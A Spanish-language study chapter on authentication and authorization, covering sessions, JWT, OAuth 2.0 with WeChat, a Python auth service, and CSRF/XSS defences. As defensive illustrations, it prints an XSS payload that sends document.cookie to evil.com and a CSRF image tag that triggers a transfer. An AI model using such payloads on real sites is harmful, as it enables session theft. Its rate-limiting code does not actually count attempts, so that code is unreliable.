# Principios de autenticación y autorización
> 💡 **Guía de estudio**: Este capítulo te lleva a profundizar en el "sistema de control de acceso" del backend: autenticación y autorización. Comenzaremos desde lo más básico, "quién eres", y avanzaremos paso a paso para dominar Session, JWT, OAuth 2.0 y otros esquemas modernos de autenticación.

<AuthEvolutionDemo />

## 0. Introducción: El "control de acceso" del sistema

¿Por qué cuando inicias sesión en WeChat y lo cierras, al volver a abrirlo sigues conectado?
¿Cómo sabe Bilibili si eres miembro VIP o un usuario normal?
¿Por qué al escanear un código QR con WeChat para iniciar sesión en un sitio de terceros no necesitas ingresar tu contraseña?

Detrás de todo esto hay un sistema central: **Autenticación y Autorización (Authentication & Authorization)**.

Si comparamos el sistema backend con un edificio:

- **Autenticación (Authentication)**: Confirma "quién eres" (verificar documento de identidad / tarjeta de acceso).
- **Autorización (Authorization)**: Confirma "a dónde puedes ir" (los VIP pueden entrar a la sala VIP, los usuarios normales no).

### 0.1 Motivación de autenticación

Solo hay una razón: **proteger los recursos**.

- **Protección de privacidad**: Tu información personal, historial de chat, solo tú puedes verlo.
- **Control de permisos**: El administrador puede eliminar usuarios, los usuarios normales no.
- **Prevención de abusos**: Evitar llamadas maliciosas y scraping de APIs.

<AuthBasicsDemo />

### 0.2 Demostración interactiva: Flujo de inicio de sesión

A través de una demostración real de inicio de sesión, comprendamos cómo funcionan la autenticación y la autorización.

<AuthInteractiveLoginDemo />

**Punto clave**: La autenticación es la primera línea de defensa; todas las operaciones sensibles deben verificar primero la identidad.

---

## 1. Conceptos básicos: Autenticación vs Autorización

### 1.1 Autenticación (Authentication): Quién eres

Confirma la identidad del usuario.

- _Ejemplo_: Ingresar usuario y contraseña, escanear huella dactilar, reconocimiento facial.
- _Salida_: Un token que representa "tu" identidad.
- _Abreviatura en inglés_: **AuthN**

### 1.2 Autorización (Authorization): Qué puedes hacer

Confirma qué permisos tiene el usuario.

- _Ejemplo_: El administrador puede eliminar artículos, el usuario normal solo puede dar "me gusta".
- _Salida_: Permitir o denegar el acceso.
- _Abreviatura en inglés_: **AuthZ**

### 1.3 Relación entre ambas

```
Solicitud del usuario → Autenticación (¿Quién eres?) → Autorización (¿Puedes hacerlo?) → Ejecutar lógica de negocio
           ↓                        ↓
      Verificar identidad      Comprobar permisos
      (¿Token válido?)         (¿Tiene permiso de eliminar?)
```

<AuthNvsAuthZDemo />

**Punto clave**: Primero autenticar, luego autorizar. Solo después de confirmar "quién eres" se puede juzgar "qué puedes hacer".

---

## 2. Evolución de los esquemas

### 2.1 Primera generación: HTTP Basic Authentication

El esquema más antiguo, que coloca directamente el nombre de usuario y la contraseña en la cabecera HTTP.

```http
GET /api/user/profile HTTP/1.1
Host: example.com
Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
                      (base64("username:password"))
```

- **Ventajas**: Simple, compatible con todos los navegadores.
- **Desventajas**:
  - Inseguro (Base64 es decodificable, equivalente a texto plano).
  - Cada solicitud debe enviar la contraseña (fácil de interceptar).
  - No se puede cerrar sesión activamente (a menos que se cierre el navegador).

**Conclusión**: Solo adecuado para herramientas de prueba internas, nunca usar en producción.

### 2.2 Segunda generación: Session + Cookie

El esquema clásico del desarrollo web.

**Flujo**:

```
1. El usuario inicia sesión (POST /login)
   → El servidor verifica usuario y contraseña
   → Crea una Session (en memoria del servidor o Redis)
   → Devuelve Set-Cookie: session_id=abc123

2. Solicitudes posteriores
   → El navegador envía automáticamente Cookie: session_id=abc123
   → El servidor busca la Session según session_id
   → Si la encuentra, considera que "tú eres tú"
```

**Ejemplo de código**:

```python
# Backend (Python Flask)
from flask import session, request

@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]
    password = request.json["password"]

    # Verificar usuario y contraseña
    user = db.authenticate(username, password)
    if user:
        # Crear Session
        session["user_id"] = user.id
        session["role"] = user.role
        return {"status": "success"}
    else:
        return {"error": "Usuario o contraseña incorrectos"}, 401

@app.route("/api/admin/users")
def get_users():
    # Verificar Session
    if "user_id" not in session:
        return {"error": "No has iniciado sesión"}, 401

    # Verificar permisos
    if session.get("role") != "admin":
        return {"error": "Permisos insuficientes"}, 403

    # Ejecutar lógica de negocio
    users = db.get_all_users()
    return {"users": users}
```

<SessionCookieDemo />

**Ventajas**:

- Simple e intuitivo, fácil de entender.
- El servidor puede cerrar sesión activamente (eliminando la Session).

**Desventajas**:

- **El servidor tiene estado**: Necesita almacenar Session, múltiples servidores requieren compartir estado (ej. Redis).
- **Difícil entre dominios**: Las cookies por defecto no pueden cruzar dominios (problema de CORS).
- **Ataques CSRF**: Sitios maliciosos pueden suplantar tu Cookie.

**Conclusión**: Adecuado para aplicaciones web tradicionales (renderizado del lado del servidor), no apto para móviles y SPA modernas.

### 2.3 Tercera generación: Token (JWT)

El esquema principal del desarrollo web moderno.

**Idea central**: No almacenar estado en el servidor, cifrar la información del usuario en un Token y guardarlo en el cliente.

**Estructura de JWT**:

```
JWT = Header.Payload.Signature

Ejemplo:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJhZG1pbiIsImV4cCI6MTYxNjIzOTAyMn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
 |--------------------------------| |-----------------------------------------------| |----------------------------|
           Header                           Payload                                      Signature
```

- **Header**: Información del algoritmo (ej. `{"alg": "HS256", "typ": "JWT"}`).
- **Payload**: Información del usuario (ej. `{"user_id": 123, "role": "admin", "exp": 1616239022}`).
- **Signature**: Firma (a prueba de manipulaciones).

**Flujo**:

```python
# 1. El usuario inicia sesión
@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]
    password = request.json["password"]

    user = db.authenticate(username, password)
    if user:
        # Generar JWT
        token = jwt.encode(
            {
                "user_id": user.id,
                "role": user.role,
                "exp": datetime.now() + timedelta(hours=24)  # Expira en 24 horas
            },
            SECRET_KEY,
            algorithm="HS256"
        )
        return {"token": token}
    else:
        return {"error": "Usuario o contraseña incorrectos"}, 401

# 2. Solicitudes posteriores
@app.route("/api/admin/users")
def get_users():
    # Obtener Token de la cabecera
    auth_header = request.headers.get("Authorization")
    if not auth_header or not auth_header.startswith("Bearer "):
        return {"error": "Token no proporcionado"}, 401

    token = auth_header.split(" ")[1]

    try:
        # Verificar y analizar Token
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
    except jwt.ExpiredSignatureError:
        return {"error": "Token expirado"}, 401
    except jwt.InvalidTokenError:
        return {"error": "Token inválido"}, 401

    # Verificar permisos
    if payload.get("role") != "admin":
        return {"error": "Permisos insuficientes"}, 403

    # Ejecutar lógica de negocio
    users = db.get_all_users()
    return {"users": users}
```

<JWTWorkflowDemo />

**Ventajas**:

- **Sin estado**: El servidor no almacena Session, fácil de escalar horizontalmente.
- **Compatible entre dominios**: Se coloca en la cabecera, sin restricciones de cookies entre dominios.
- **Compatible con móviles**: Las apps nativas también pueden usarlo fácilmente.
- **Información rica**: El Payload puede almacenar información del usuario, permisos, etc.

**Desventajas**:

- **No se puede cerrar sesión activamente**: Una vez emitido el Token, es válido hasta que expire (a menos que se use una lista negra).
- **Payload visible**: Codificación Base64, no se puede almacenar información sensible (como contraseñas).
- **Token grande**: Se debe enviar en cada solicitud, varios cientos de bytes.

**Conclusión**: El esquema estándar para web moderna y móviles.

<SessionVsJWTDemo />

---

## 3. OAuth 2.0: Inicio de sesión con terceros

Seguro que has visto este botón: "Iniciar sesión con WeChat", "Iniciar sesión con Google".

Esto es **OAuth 2.0**: un marco de **autorización** (¡no de autenticación!).

### 3.1 Roles principales

| Rol                       | Descripción                  | Ejemplo               |
| :------------------------ | :--------------------------- | :-------------------- |
| **Resource Owner**        | Propietario del recurso (usuario) | Tú                   |
| **Client**                | Aplicación de terceros       | Un sitio web          |
| **Authorization Server**  | Servidor de autorización     | WeChat, Google        |
| **Resource Server**       | Servidor de recursos         | API de información de usuario de WeChat |

### 3.2 Modo Authorization Code (Authorization Code Flow)

El modo más seguro, adecuado para servidores con backend.

**Flujo**:

```
1. El usuario hace clic en "Iniciar sesión con WeChat"
   → Redirige a la página de autorización de WeChat
   https://open.weixin.qq.com/connect/qrconnect?
     appid=APPID&
     redirect_uri=https://yourapp.com/callback&
     response_type=code&
     scope=snsapi_login&
     state=STATE

2. El usuario escanea el código QR y acepta la autorización
   → WeChat redirige de vuelta a tu sitio web
   https://yourapp.com/callback?code=AUTHORIZATION_CODE&state=STATE

3. Tu backend usa el code para obtener el access_token
   POST https://api.weixin.qq.com/sns/oauth2/access_token
   {
     "appid": "APPID",
     "secret": "SECRET",
     "code": "AUTHORIZATION_CODE",
     "grant_type": "authorization_code"
   }
   → Devuelve: { "access_token": "...", "openid": "..." }

4. Usa el access_token para obtener la información del usuario
   GET https://api.weixin.qq.com/sns/userinfo?
     access_token=ACCESS_TOKEN&
     openid=OPENID
   → Devuelve: { "nickname": "Zhang San", "headimgurl": "..." }
```

<OAuth2FlowDemo />

**Ejemplo de código**:

```python
from flask import request, redirect

@app.route("/login/wechat")
def login_wechat():
    # 1. Redirigir a la página de autorización de WeChat
    auth_url = (
        "https://open.weixin.qq.com/connect/qrconnect"
        f"?appid={APPID}"
        f"&redirect_uri={urlencode(REDIRECT_URI)}"
        "&response_type=code"
        "&scope=snsapi_login"
        f"&state={generate_state()}"
    )
    return redirect(auth_url)

@app.route("/callback")
def wechat_callback():
    # 2. Obtener code
    code = request.args.get("code")
    state = request.args.get("state")

    # Verificar state (anti CSRF)
    if not verify_state(state):
        return {"error": "Invalid state"}, 400

    # 3. Usar code para obtener access_token
    token_resp = requests.post(
        "https://api.weixin.qq.com/sns/oauth2/access_token",
        params={
            "appid": APPID,
            "secret": SECRET,
            "code": code,
            "grant_type": "authorization_code"
        }
    ).json()

    access_token = token_resp["access_token"]
    openid = token_resp["openid"]

    # 4. Obtener información del usuario
    user_info = requests.get(
        "https://api.weixin.qq.com/sns/userinfo",
        params={
            "access_token": access_token,
            "openid": openid
        }
    ).json()

    # 5. Crear o actualizar usuario localmente
    user = db.get_or_create_user(
        openid=openid,
        nickname=user_info["nickname"],
        avatar=user_info["headimgurl"]
    )

    # 6. Generar JWT del sistema local
    token = jwt.encode(
        {"user_id": user.id, "exp": ...},
        SECRET_KEY
    )

    return {"token": token}
```

**Puntos clave**:

- **code solo se puede usar una vez**: Se invalida después de usarse, evita interceptaciones.
- **state anti CSRF**: Genera una cadena aleatoria, verifica en el callback para evitar falsificaciones de sitios maliciosos.
- **redirect_uri debe coincidir**: Registrado previamente en la plataforma abierta de WeChat, evita ataques de redirección.

### 3.3 Otros modos

| Modo                                  | Escenario aplicable                    | Seguridad         |
| :------------------------------------ | :------------------------------------- | :---------------- |
| **Authorization Code**                | Servidores con backend                 | ⭐⭐⭐⭐⭐         |
| **Implicit**                          | Aplicaciones frontend puras (SPA)      | ⭐⭐⭐ (no recomendado) |
| **Resource Owner Password**           | Aplicaciones de alta confianza (app oficial) | ⭐⭐          |
| **Client Credentials**                | Comunicación entre servidores (sin usuario) | ⭐⭐⭐⭐       |

<OAuth2ModesDemo />

---

## 4. Práctica: Diseñar un sistema de autenticación completo

### 4.1 Análisis de requisitos

- **Soporte multiplataforma**: Web, iOS, Android.
- **Inicio de sesión con terceros**: WeChat, Google.
- **Control de permisos**: Usuario normal, VIP, administrador.
- **Seguridad**: Anti-scraping, anti-secuestro, anti-repetición.

### 4.2 Diseño de arquitectura

```
┌─────────────┐
│   Cliente    │
└──────┬──────┘
       │
       ▼
┌─────────────────────────────────┐
│         API Gateway             │
│  - Rate Limiting                │
│  - Token Validation             │
└──────┬──────────────────────────┘
       │
       ▼
┌─────────────────────────────────┐
│      Auth Service               │
│  - Registro, inicio de sesión   │
│  - Emisión y verificación de Token │
│  - Integración OAuth 2.0        │
└──────┬──────────────────────────┘
       │
       ▼
┌─────────────────────────────────┐
│    Business Services            │
│  - User Service                 │
│  - Order Service                │
│  - Payment Service              │
└─────────────────────────────────┘
```

### 4.3 Diseño de base de datos

```sql
-- Tabla de usuarios
CREATE TABLE users (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(50) UNIQUE NOT NULL,
    password_hash VARCHAR(255) NOT NULL,  -- hash bcrypt
    email VARCHAR(100) UNIQUE,
    role ENUM('user', 'vip', 'admin') DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    INDEX idx_username (username),
    INDEX idx_email (email)
);

-- Tabla de vinculación de inicio de sesión con terceros
CREATE TABLE user_auth_providers (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    user_id BIGINT NOT NULL,
    provider ENUM('wechat', 'google', 'github') NOT NULL,
    provider_user_id VARCHAR(100) NOT NULL,  -- ID de usuario del tercero
    access_token TEXT,  -- almacenamiento cifrado
    refresh_token TEXT,
    expires_at TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    UNIQUE KEY uk_provider_provider_user_id (provider, provider_user_id),
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- Lista negra de tokens (para cierre de sesión activo)
CREATE TABLE token_blacklist (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    token_jti VARCHAR(100) UNIQUE NOT NULL,  -- JTI del JWT (identificador único)
    expired_at TIMESTAMP NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_expired_at (expired_at)
);
```

<AuthDatabaseDemo />

### 4.4 Implementación de código

```python
# auth_service.py
import bcrypt
import jwt
from datetime import datetime, timedelta

SECRET_KEY = "your-secret-key-here"  # En producción usar variables de entorno

class AuthService:
    def register(self, username: str, password: str, email: str = None):
        # 1. Verificar si el usuario ya existe
        if db.get_user_by_username(username):
            raise ValueError("El usuario ya existe")

        # 2. Hashear contraseña (bcrypt)
        password_hash = bcrypt.hashpw(
            password.encode('utf-8'),
            bcrypt.gensalt(rounds=12)
        ).decode('utf-8')

        # 3. Crear usuario
        user = db.create_user(
            username=username,
            password_hash=password_hash,
            email=email
        )

        # 4. Emitir Token
        return self._generate_tokens(user)

    def login(self, username: str, password: str):
        # 1. Consultar usuario
        user = db.get_user_by_username(username)
        if not user:
            raise ValueError("Usuario o contraseña incorrectos")

        # 2. Verificar contraseña
        if not bcrypt.checkpw(
            password.encode('utf-8'),
            user.password_hash.encode('utf-8')
        ):
            raise ValueError("Usuario o contraseña incorrectos")

        # 3. Emitir Token
        return self._generate_tokens(user)

    def _generate_tokens(self, user):
        now = datetime.now()

        # Access Token (corto plazo, ej. 1 hora)
        access_token = jwt.encode(
            {
                "user_id": user.id,
                "role": user.role,
                "type": "access",
                "iat": now,
                "exp": now + timedelta(hours=1),
                "jti": str(uuid4())  # Identificador único
            },
            SECRET_KEY,
            algorithm="HS256"
        )

        # Refresh Token (largo plazo, ej. 30 días)
        refresh_token = jwt.encode(
            {
                "user_id": user.id,
                "type": "refresh",
                "iat": now,
                "exp": now + timedelta(days=30),
                "jti": str(uuid4())
            },
            SECRET_KEY,
            algorithm="HS256"
        )

        return {
            "access_token": access_token,
            "refresh_token": refresh_token,
            "token_type": "Bearer",
            "expires_in": 3600  # Tiempo de expiración del access_token (segundos)
        }

    def refresh(self, refresh_token: str):
        try:
            payload = jwt.decode(refresh_token, SECRET_KEY, algorithms=["HS256"])
            if payload.get("type") != "refresh":
                raise ValueError("Invalid token type")

            user = db.get_user_by_id(payload["user_id"])
            return self._generate_tokens(user)
        except jwt.ExpiredSignatureError:
            raise ValueError("Refresh token expirado")
        except jwt.InvalidTokenError:
            raise ValueError("Refresh token inválido")

    def logout(self, token: str):
        # Agregar Token a la lista negra
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
        db.add_to_blacklist(
            jti=payload["jti"],
            expired_at=datetime.fromtimestamp(payload["exp"])
        )

    def verify_token(self, token: str):
        try:
            payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])

            # Verificar si está en la lista negra
            if db.is_token_blacklisted(payload["jti"]):
                raise ValueError("Token revocado")

            return payload
        except jwt.ExpiredSignatureError:
            raise ValueError("Token expirado")
        except jwt.InvalidTokenError:
            raise ValueError("Token inválido")

# Decorador de API
def require_auth(auth_service: AuthService):
    def decorator(f):
        def wrapper(*args, **kwargs):
            # Obtener Token de la cabecera
            auth_header = request.headers.get("Authorization")
            if not auth_header or not auth_header.startswith("Bearer "):
                return {"error": "Token no proporcionado"}, 401

            token = auth_header.split(" ")[1]

            try:
                # Verificar Token
                payload = auth_service.verify_token(token)
                # Inyectar información del usuario en el contexto de la solicitud
                request.user = payload
                return f(*args, **kwargs)
            except ValueError as e:
                return {"error": str(e)}, 401

        return wrapper
    return decorator

def require_role(*roles):
    def decorator(f):
        def wrapper(*args, **kwargs):
            if not hasattr(request, "user"):
                return {"error": "No has iniciado sesión"}, 401

            if request.user["role"] not in roles:
                return {"error": "Permisos insuficientes"}, 403

            return f(*args, **kwargs)
        return wrapper
    return decorator

# Ejemplo de uso
@app.route("/api/admin/users", methods=["GET"])
@require_auth(auth_service)
@require_role("admin")
def get_users():
    users = db.get_all_users()
    return {"users": users}

@app.route("/api/user/profile", methods=["GET"])
@require_auth(auth_service)
def get_profile():
    user = db.get_user_by_id(request.user["user_id"])
    return {"user": user}

@app.route("/auth/refresh", methods=["POST"])
def refresh_token():
    refresh_token = request.json.get("refresh_token")
    try:
        tokens = auth_service.refresh(refresh_token)
        return tokens
    except ValueError as e:
        return {"error": str(e)}, 401
```

<CompleteAuthSystemDemo />

---

## 5. Mejores prácticas de seguridad

### 5.1 Almacenamiento de contraseñas

**❌ Prácticas incorrectas**:

```python
# Almacenamiento en texto plano (¡absolutamente no!)
db.save_password(username, password)

# Hash MD5 / SHA1 (no es suficientemente seguro, vulnerable a tablas arcoíris)
hash = md5(password)
db.save_password(username, hash)
```

**✅ Prácticas correctas**:

```python
# bcrypt (hash adaptativo, hash lento para prevenir fuerza bruta)
import bcrypt

password_hash = bcrypt.hashpw(
    password.encode('utf-8'),
    bcrypt.gensalt(rounds=12)  # Cuanto mayor sea rounds, más seguro pero más lento
)

# Verificación
if bcrypt.checkpw(password.encode('utf-8'), password_hash):
    # Contraseña correcta
```

**¿Por qué bcrypt?**

- **Lento**: Diseñado intencionadamente para ser lento (milisegundos), previene fuerza bruta.
- **Adaptativo**: Se puede ajustar rounds, se fortalece a medida que el hardware mejora.
- **Con sal**: Incluye sal aleatoria por defecto, previene tablas arcoíris.

<PasswordHashingDemo />

### 5.2 Prevención de fuerza bruta

- **Rate Limiting**: Misma IP / nombre de usuario, solo 5 intentos por minuto.
- **CAPTCHA**: Después de 3 intentos fallidos, solicitar CAPTCHA.
- **Bloqueo de cuenta**: Después de 10 intentos fallidos, bloquear la cuenta por 30 minutos.

```python
from functools import lru_cache
import time

@lru_cache(maxsize=10000)
def get_login_attempts(identifier: str) -> tuple:
    """Devuelve (número de intentos, hora del primer intento)"""
    return (0, 0)

def check_rate_limit(identifier: str):
    attempts, first_attempt = get_login_attempts(identifier)
    now = time.time()

    # Reiniciar después de 1 minuto
    if now - first_attempt > 60:
        get_login_attempts.cache_clear()
        return True

    # Más de 5 intentos, denegar
    if attempts >= 5:
        return False

    return True

def record_login_attempt(identifier: str):
    attempts, first_attempt = get_login_attempts(identifier)
    if attempts == 0:
        first_attempt = time.time()
    get_login_attempts.cache_clear()
    get_login_attempts(identifier)  # Volver a cachear

@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]

    # Verificar rate limit
    if not check_rate_limit(username):
        return {"error": "Demasiados intentos, inténtalo de nuevo en 1 minuto"}, 429

    password = request.json["password"]

    # Verificar contraseña
    user = db.get_user_by_username(username)
    if user and bcrypt.checkpw(password.encode(), user.password_hash.encode()):
        # Inicio de sesión exitoso, limpiar contador
        get_login_attempts.cache_clear()
        return {"token": generate_token(user)}
    else:
        # Inicio de sesión fallido, registrar
        record_login_attempt(username)
        return {"error": "Usuario o contraseña incorrectos"}, 401
```

### 5.3 Prevención de CSRF (Cross-Site Request Forgery)

**Escenario de ataque**:
Iniciaste sesión en el sitio del banco `bank.com`, luego visitaste un sitio malicioso `evil.com`. La página de `evil.com` tiene este código:

```html
<img src="https://bank.com/api/transfer?to=attacker&amount=10000" />
```

Tu navegador enviará esta solicitud con la Cookie del banco (solicitud entre dominios), provocando la transferencia de fondos.

**Medidas de defensa**:

1.  **CSRF Token**:
    - El servidor genera un Token aleatorio y lo coloca en el formulario.
    - Al enviar, verifica que el Token coincida.

```python
from flask import session

@app.route("/api/transfer", methods=["POST"])
def transfer():
    # Verificar CSRF Token
    token = request.headers.get("X-CSRF-Token")
    if token != session.get("csrf_token"):
        return {"error": "CSRF Token inválido"}, 403

    # Ejecutar transferencia
    ...
```

2.  **SameSite Cookie**:
    - Configurar el atributo `SameSite` de la Cookie a `Strict` o `Lax`.

```python
# Ejemplo Flask
app.config.update(
    SESSION_COOKIE_SAMESITE='Lax',  # o 'Strict'
    SESSION_COOKIE_SECURE=True      # Solo permitir HTTPS
)
```

3.  **Usar JWT (sin Cookie)**:
    - JWT se almacena en `localStorage`, no se envía automáticamente, protección natural contra CSRF.

<CSRFDefenseDemo />

### 5.4 Prevención de XSS (Cross-Site Scripting)

**Escenario de ataque**:
Un usuario malicioso ingresa en la sección de comentarios:

```html
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>
```

Si el sitio web renderiza directamente este contenido, las Cookies de otros usuarios serán robadas.

**Medidas de defensa**:

1.  **Escapado de salida**:
    - Convertir `<` en `&lt;`, `>` en `&gt;`.

```python
import html

def render_comment(comment):
    # Escapar HTML
    safe_comment = html.escape(comment)
    return f"<div class='comment'>{safe_comment}</div>"
```

2.  **Content Security Policy (CSP)**:
    - Configurar cabecera HTTP para restringir el origen de los scripts.

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

3.  **HttpOnly Cookie**:
    - Configurar el atributo `HttpOnly` de la Cookie, JavaScript no puede leerla.

```python
app.config.update(
    SESSION_COOKIE_HTTPONLY=True
)
```

<XSSDefenseDemo />

---

## 6. Resumen y ruta de aprendizaje

La autenticación es la "base" del sistema backend; dominarla permite construir aplicaciones seguras y confiables.

### 6.1 Conocimientos clave

| Conocimiento                     | Importancia | Dificultad | Frecuencia en práctica |
| :------------------------------- | :---------- | :--------- | :--------------------- |
| **Session + Cookie**             | ⭐⭐⭐⭐    | Media      | Alta                   |
| **JWT**                          | ⭐⭐⭐⭐⭐  | Baja       | Muy alta               |
| **OAuth 2.0**                    | ⭐⭐⭐⭐    | Alta       | Alta                   |
| **Hash de contraseñas (bcrypt)** | ⭐⭐⭐⭐⭐  | Baja       | Muy alta               |
| **Rate limiting y anti fuerza bruta** | ⭐⭐⭐⭐⭐ | Media  | Muy alta               |
| **Defensa CSRF**                 | ⭐⭐⭐⭐    | Media      | Media                  |
| **Defensa XSS**                  | ⭐⭐⭐⭐    | Baja       | Alta                   |

### 6.2 Ruta de aprendizaje

1.  **Introducción** (1-2 días):
    - Comprender autenticación vs autorización.
    - Dominar los principios de Session + Cookie.
    - Implementar una función simple de registro e inicio de sesión.

2.  **Intermedio** (1 semana):
    - Aprender los principios e implementación de JWT.
    - Implementar un sistema de autenticación basado en JWT.
    - Dominar el hash de contraseñas (bcrypt).

3.  **Práctica** (2-4 semanas):
    - Integrar OAuth 2.0 (inicio de sesión con WeChat, Google).
    - Implementar rate limiting y anti fuerza bruta.
    - Defender contra ataques comunes como CSRF, XSS.

4.  **Profundización** (continuo):
    - Aprender RBAC (Control de Acceso Basado en Roles).
    - Investigar SSO (Inicio de Sesión Único).
    - Explorar Zero Trust Architecture (Arquitectura de Confianza Cero).

### 6.3 Recursos recomendados

- **Estándares**:
  - RFC 6749 (OAuth 2.0)
  - RFC 7519 (JWT)
- **Artículos**:
  - JWT.io: https://jwt.io/
  - OAuth 2.0 Simplified: https://oauth.net/2/
- **Herramientas**:
  - jwt.io (depuración de JWT en línea)
  - Postman (pruebas de API)

---

## 7. Glosario

| Término           | Nombre completo             | Explicación                                                                                             |
| :---------------- | :-------------------------- | :------------------------------------------------------------------------------------------------------ |
| **AuthN**         | Authentication              | **Autenticación**. Confirma "quién eres" (ej. verificar identidad con contraseña).                      |
| **AuthZ**         | Authorization               | **Autorización**. Confirma "qué puedes hacer" (ej. solo el administrador puede eliminar).               |
| **Session**       | -                           | **Sesión**. Información de estado del usuario almacenada en el servidor.                                |
| **Cookie**        | -                           | **Galleta**. Pequeños datos almacenados en el navegador, se envían automáticamente en cada solicitud.   |
| **JWT**           | JSON Web Token              | **Token Web JSON**. Un esquema de autenticación sin estado, compuesto por Header, Payload y Signature.  |
| **OAuth 2.0**     | -                           | **Autorización abierta**. Marco estandarizado para inicio de sesión con terceros (ej. "Iniciar con WeChat"). |
| **SSO**           | Single Sign-On              | **Inicio de sesión único**. Iniciar sesión una vez para acceder a múltiples aplicaciones (ej. cuenta de Google para todos los servicios de Google). |
| **RBAC**          | Role-Based Access Control   | **Control de acceso basado en roles**. Decide los permisos según el rol del usuario (ej. admin, user).  |
| **CSRF**          | Cross-Site Request Forgery  | **Falsificación de solicitud entre sitios**. El atacante induce al usuario a enviar solicitudes maliciosas (ej. usar tu Cookie para transferir fondos). |
| **XSS**           | Cross-Site Scripting        | **Secuencias de comandos entre sitios**. El atacante inyecta scripts maliciosos en la página web (ej. robar Cookies). |
| **bcrypt**        | -                           | **Algoritmo de hash de contraseñas**. Un algoritmo de hash lento, diseñado específicamente para almacenamiento de contraseñas, anti fuerza bruta. |
| **Access Token**  | -                           | **Token de acceso**. Token de corta duración, usado para acceder a APIs.                                |
| **Refresh Token** | -                           | **Token de actualización**. Token de larga duración, usado para obtener un nuevo Access Token.          |
| **Scope**         | -                           | **Ámbito de permisos**. Concepto en OAuth 2.0, indica los permisos solicitados por la aplicación de terceros (ej. leer información del usuario). |
| **PKCE**          | Proof Key for Code Exchange | **Clave de prueba para intercambio de código**. Extensión de OAuth 2.0 para mejora de seguridad en clientes públicos (ej. SPA). |